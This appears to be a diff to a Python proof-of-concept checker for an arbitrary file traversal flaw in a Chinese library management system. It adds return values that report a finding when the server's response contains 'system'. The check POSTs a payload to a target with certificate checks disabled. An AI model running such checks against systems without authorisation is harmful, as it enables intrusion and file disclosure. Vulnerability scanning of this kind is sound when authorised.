@@ -36,11 +36,14 @@ class clib_kindaction_fileread_BaseVerify:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if req.status_code == 200 and r"system" in req.text:
                 cprint("[+]存在五车图书管系统kindaction任意文件遍历漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+                return True, vulnurl, "五车图书管系统kindaction任意文件遍历", payload, req.text
             else:
                 cprint("[-]不存在clib_kindaction_fileread漏洞", "white", "on_grey")
+                return False, None, None, None, None
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
